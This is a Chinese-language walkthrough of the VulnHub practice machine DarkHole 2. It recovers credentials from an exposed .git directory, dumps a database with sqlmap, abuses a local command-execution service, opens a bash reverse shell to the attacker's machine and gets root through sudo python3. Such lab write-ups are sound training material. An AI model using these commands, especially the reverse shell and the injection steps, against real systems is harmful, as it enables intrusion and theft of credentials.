@@ -1,0 +1,315 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uR2ix0EM6VMwb_wZgpzX_w)
+
+声明
+--
+
+**本文仅供学习参考，其中涉及的一切资源均来源于网络，请勿用于任何非法行为，否则您将自行承担相应后果，我不承担任何法律及连带责任。**
+
+靶场信息：
+
+> 地址：https://www.vulnhub.com/entry/darkhole-2,740/ 发布日期：2021 年 9 月 3 日 难度：难 目标：获得 root 权限
+> 
+> 运行：VMware
+> 
+> 提示：不要为 Brute-Force 浪费时间
+
+一、信息收集
+------
+
+### 1 获取靶机 ip
+
+```
+netdiscover -r 10.0.1.0/24 -i eth0
+```
+
+得到 ip 地址：10.0.1.4
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9znKzTUBrSLSuIbrGSAywa2ZZ6rjt2T84b1Am6A93d5JfoSwGXKcUvA/640?wx_fmt=png)image-20211024161617081
+
+### 2 访问靶机
+
+```
+http://10.0.1.4/
+```
+
+image-20211024190651022
+
+### 3 开放端口服务信息获取
+
+```
+nmap -v -T4 -p- -A -oN nmap.log 10.0.1.4
+```
+
+得到信息（存在. git 泄露）：
+
+```
+PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set| http-git: |   10.0.1.4:80/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file 'description' to name the...|_    Last commit message: i changed login.php file for more secure | http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: DarkHole V2
+```
+
+注意这里的 80 端口服务中扫描到. Git 信息，可以利用. git 信息泄露漏洞获取源码
+
+8585 端口安装有 gitea web 应用
+
+### 4 目录扫描
+
+```
+dirsearch -u http://10.0.1.3/
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9I9KlicJtcwV0jRvZQ5Me4buDmsdUYGLUJdZYfq0MSOw3W6gJibX3ibLlw/640?wx_fmt=png)image-20211024141931082
+
+```
+gobuster dir -u http://10.0.1.3/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.zip
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ92qDZlLoydsibIoR8Ih15epzLEWzN8NOFuuTz8PlPTsI29DtJkZ9aVUg/640?wx_fmt=png)image-20211024141953029
+
+二、漏洞探测 + 利用
+-----------
+
+### 1. 获取源码方法 1
+
+使用 wget 和 git
+
+```
+wget递归下载所有文件
+wget -r http://192.168.19.137/.git
+```
+
+这将创建一个名称为 IP 地址的目录。在目录中，它包含递归下载的文件，包括 “.git”。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9SUicBxpPsfPXL8UzMuwWdhGXr6t89IL2LQLxl51ic40fahHBwUbVCnCA/640?wx_fmt=png)image-20211024174706062
+
+按如下方式克隆它。
+
+```
+git clone . webapp
+```
+
+这将创建一个 git 存储库 “webapp”，我们可以在其中执行所有 git 操作。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ95wVHN21lLdkvqEF3104Ctz6jk3ibn1QeWX5ibndkvabuononibDvJFcqw/640?wx_fmt=png)image-20211024174748344
+
+在 login.php 页面上，我们看到了登录逻辑。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9fZoGbbrDkd3LjVZQkqoQiaggycKmPzPmBN0ARdWVicOfvuB5F4ZBc1bw/640?wx_fmt=png)image-20211024174856663
+
+显示的部分正在清理输入。因此，我们无法执行 SQL 注入。但是，当我检查 git 日志时，我们会在同一个地方看到凭据。
+
+执行
+
+```
+git log
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9AqDSllHJ3Gzscs1NdJ53HicN0teuLENdIvyxicqic8rGt5We8ksB84nIA/640?wx_fmt=png)image-20211024174945812
+
+git 日志中，我们看到作者在第二次提交时添加了默认凭据。因此，让我们将 HEAD 切换到该提交。
+
+```
+git checkout a4d9
+cat login.php
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9qJ4EZSyJWLcX0d3KjiaXQqxAgEbmm3t4jZibGwdShulY5cnric78LIlhw/640?wx_fmt=png)image-20211024175114798
+
+```
+lush@admin.com/321
+```
+
+现在，我们可以看到 ID 为 1 的用户的凭据。我们现在可以轻松登录 Web 应用程序
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9L2uqtUfrVTM8ZMApcN6PbE6KslSOudB9yWwI4cnI2yv0BMwnzQrDMw/640?wx_fmt=png)image-20211024175406805
+
+### 2. 获取源码方法 2
+
+使用 GitTools 工具
+
+```
+https://github.com/internetwache/GitTools
+```
+
+共有三种工具，我将使用其中的两种。
+
+```
+将.git目录转储到目录gitdump。
+./Dumper/gitdumper.sh http://10.0.1.4/.git/ gitdump
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9NvCb3ScUeVuHSIPbCSIU3UzjYwKwDJUBTzaNBR7G5qiavTLGIeZof8Q/640?wx_fmt=png)image-20211024175822528
+
+```
+将提取源代码并按照提交进行组织
+./Extractor/extractor.sh . .
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9QZ6zqicswTYos4NTg8wfibZ8siap9bbkHQPNEcYb27M3jmYgy0UUnj0yA/640?wx_fmt=png)image-20211024175906187![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ94TqpDRic2XZcqnrXLZbBvTnZwBM5madJWVwHLFXDfuWbYtD00LicTicpQ/640?wx_fmt=png)image-20211024175931653
+
+这样，我们就可以从 .git 目录中获取源代码了。
+
+其余的和之前的一样。唯一的区别是它将所有内容转储到单独的目录中。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9sIGRZiaIdzl4dr2UtBGubKg60TXwyb185ZuhNFq72qETIeovH5mXAQQ/640?wx_fmt=png)image-20211024180133241
+
+### 2.SQL 注入
+
+URL 上，我们看到一个 GET 参数 “id”。当我们改变它的值时，我们也可以观察到页面的变化。
+
+id=null 时，数据为空
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9VqicNVNWNDwK5P0HaQiasEJJRIwickd1icqjDV9icaJbIN7Fz2nd0cLJCWQ/640?wx_fmt=png)image-20211024180328913
+
+单引号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9ImOK1xYXHj6IyCAdoHCUkwqB5IQ5IN2u7Wg5ibbjZAPkD2Y1pSusMYQ/640?wx_fmt=png)image-20211024180424062
+
+sqlmap 跑一下
+
+将请求包保存到文件，
+
+```
+sqlmap -r sql3 -p id --random-agent
+```
+
+存在 union 注入
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9RFibuvORTloDh91nIZeQtklX1mI3BDicAtv3kLxDH9SPhgBYATG2xfxQ/640?wx_fmt=png)image-20211024180646822
+
+判断权限为 DBA
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9HJO2gXqvXRlMiaProoUb14YNvHbrjlJSKpicVZC1fricobY3BdvE7SsMg/640?wx_fmt=png)image-20211024180726764
+
+os-shell 失败，不知道网站路径
+
+前面 git 找到数据库的库名是 darkhole_2
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9TPUO6f5ia2pibXbETFbE1ebc1Rly7s9CCKAsFESKn92s2S9v51JZlj3w/640?wx_fmt=png)image-20211024181636505
+
+用 sqlmap 跑这个库看看有什么表
+
+```
+sqlmap -r sql3 -p id --random-agent --is-dba --technique=U --current-db
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9grnMTEIUXGqylqgnIW4VZRqAcHgSW47gVicSyjJyBLEyFO1QJ7LMqjQ/640?wx_fmt=png)image-20211024181729918
+
+```
+sqlmap -r sql3 -p id --random-agent --is-dba --technique=U -D darkhole_2 --tables
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9bibwcFW2xxyqvahvvqsWl9MjoibUXOoLR41IjEuW2wZdjbcvCd1zZD9w/640?wx_fmt=png)image-20211024181756132
+
+ssh 这个表应该有问题，看列名
+
+```
+sqlmap -r sql3 -p id --random-agent --is-dba --technique=U -D darkhole_2 -T ssh --columns
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ94rFuEjEPm4TbRLScCjhbBxH3JHv8GicEy2N5Rfy1LrTXPU2uB22mvyQ/640?wx_fmt=png)image-20211024181927969
+
+### 3. 得到 ssh 用户名密码
+
+```
+sqlmap -r sql3 -p id --random-agent --is-dba --technique=U -D darkhole_2 -T ssh --dump
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9Rzzicsiba1zBCOFhH7duj2r7q4dhNLCN9jYxFibewLWEAfL083f2Rt0gA/640?wx_fmt=png)image-20211024182033773
+
+```
++----+------+--------+
+| id | pass | user   |
++----+------+--------+
+| 1  | fool | jehad  |
++----+------+--------+
+```
+
+ssh 登录
+
+```
+ssh jehad@10.0.1.4
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9YnYSQoHjHjRg9fHianIEj3OMzAy8ZbNCMlH7Cv6PN8vYFR5chuicv0vg/640?wx_fmt=png)image-20211024182739700
+
+### 4. 发现命令执行
+
+查看 jehad 用户的命令记录
+
+```
+cat .bash_history
+```
+
+发现命令执行
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9H7Pic6UZadvBjCviaEqVQBEmVibxOuibZcWlAxbsTu4Juu6G8Y9Da3WUaw/640?wx_fmt=png)image-20211024183147660
+
+试一下果然能行，是 losy 用户的权限
+
+```
+curl "http://127.0.0.1:9999/?cmd=id"
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9XZorR14MW06d3cn58Z5z1bRRunGjYzcpeMpZwkcE1ARWYb0XKsKGag/640?wx_fmt=png)image-20211024183209010
+
+### 5. 获取 losy 用户 shell
+
+将反弹 shell 的文件下载到 / tmp 路径，kali 的 ip 是 10.0.1.12
+
+```
+#!/bin/bashbash -i >& /dev/tcp/10.0.1.12/6666 0>&1
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ92LNiaAj6DN4z0DOqR5KcQyTLDtTbp5vLeLdNKnia0s13uicVHOyQGZgTQ/640?wx_fmt=png)image-20211024184728185![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9BAOQVvyYKODgIQOzofW210H11Pe8lvVicp4UkITBE0ZIDkiaXhMR8FKA/640?wx_fmt=png)image-20211024184752397
+
+```
+curl "http://127.0.0.1:9999/?cmd=bash%20/tmp/shell"
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9CkLTR2KicJpVpH1icrCUWp8ib4nsZibcSe0NQksW240Eiac6y1RrZyZkepw/640?wx_fmt=png)image-20211024184819008
+
+### 6.user.txt
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9KAuGgiaJObPJeNEmXTViav2iar6WXEAVC9LaQnMO9vLPFx1wWGfUw4peA/640?wx_fmt=png)image-20211024184856738
+
+### 7. 获取 losy 密码
+
+再次查看历史记录，发现 losy 密码是 gang
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9r5AAicUUlKGMIuA63l86HdvrIEgPZbcfrBbZTSvYU7nD2U5ew2ywrgA/640?wx_fmt=png)image-20211024185117045
+
+成功连接 ssh
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9RuJYo6RLskkBrhB4XVlSSTQo76jHufqHupASeVmbiadzcrZzZJpdMibQ/640?wx_fmt=png)image-20211024185156858
+
+查看 losy 用户的 sudo 权限（jehad 用户无法使用 sudo）
+
+可以使用 python3
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ9goRtSMKCzEuIZ5o9Os9kpTgUiaDKwiaz411DUYv8STG70W5MY1v5oQcQ/640?wx_fmt=png)image-20211024185636798
+
+三、权限提升
+------
+
+### 1. 获取 root 权限
+
+```
+sudo python3 -c 'import os; os.system("/bin/sh")'
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpBlKffibFM98lvicafBmDlJ95FhqJuEia1QwbCeibQwSHqLUfLFGEtTyekvE9iaiavbfXNzjIkyzCM6sPg/640?wx_fmt=png)image-20211024185736417
+
+### 2. 获取 root flag
+
+```
+DarkHole{'Legend'}
+```
+
+总结
+--
+
+这台靶机难度定义的是难，但也不难，比第一个难一点点。我翻了一下网上的教程，他们居然没看历史命令记录，好吧，这可能是出题人忘记删掉了，但难度还行吧。命令记录会保留一个 crontab 的计划任务，这用 LinEnum 脚本很容易发现，然后就是通过查看源码发现命令执行的 web 服务，进行反弹 shell 得到 losy 的 shell，在历史记录中发现 losy 的密码，登上去 ssh，查看 sudo 即可使用 python3 获取 root 权限。
+
+参考
+--
+
+https://nepcodex.com/2021/09/darkhole_2-walkthrough-vulnhub-writeup/
